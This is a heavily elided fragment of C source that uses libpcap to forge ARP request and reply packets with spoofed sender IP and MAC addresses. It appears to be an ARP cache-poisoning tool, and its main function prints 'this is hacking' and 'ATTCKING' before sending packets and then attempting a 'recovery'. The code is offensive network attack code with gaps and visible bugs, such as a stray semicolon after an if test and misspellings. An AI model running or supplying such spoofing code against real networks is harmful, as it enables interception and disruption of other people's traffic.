                                   ...
                                   in_addr *_targetip, uint8_t *_targetmac, int flag)
{
    ...
    {
        arp_req_hdr.ar_op = htons(ARPOP_REPLY);
    ...
    else if(flag == 3)
    {
        ...
        arp_req_hdr.ar_op = htons(ARPOP_REQUEST);
        memset(ethernet_hdr.ether_dhost,0xff,6);
        memcpy(ethernet_hdr.ether_shost,_targetmac,6);
        memcpy(arp_req_hdr.ar_sender_ip,_targetip,4);
        memcpy(arp_req_hdr.ar_sender_mac,_targetmac,6);
        memcpy(arp_req_hdr.ar_target_ip,_senderip,4);
        memset(arp_req_hdr.ar_target_mac,0,6);
        memcpy(_packet,&ethernet_hdr,sizeof(ethernet_hdr));
        memcpy(_packet+sizeof(ethernet_hdr),&arp_req_hdr, sizeof(arp_req_hdr));
        pcap_sendpacket(handle,_packet,sizeof(libnet_ethernet_hdr) + sizeof(arp_hdr));
        dump(_packet,sizeof(libnet_ethernet_hdr) + sizeof(arp_hdr));
    }
    else
        printf("not setting!!\n");
...
{   libnet_ethernet_hdr *recv_ethernet = (libnet_ethernet_hdr *)packet;
    ...
    if(recv_ethernet->ether_type == htons(ETHERTYPE_ARP))
    {
        ...
        {
            memcpy(mac,recv_ethernet->ether_shost,6);
            return true;
        }
    }
    return false;
...
int main(int argc, char *argv[])
{
    ...
    //infection
    int setting;
    printf("WARNING : this is hacking...\n");
    printf("ATTCKING....\n");
    ...
    if(setting == 1)
    {
        ...
        relay_setting = false;
        if(arp_request_infection_reverse(p_handle,0 ,0, &targetip,0,&recvip,recvmac,3) == true);
        printf("recovery seuceess....\n");
        //arp_request_infection_reverse(p_handle,0 ,0, &recvip,0,&targetip,targetmac,3);
    }
    printf("end attack....\n");
    return 0;
}
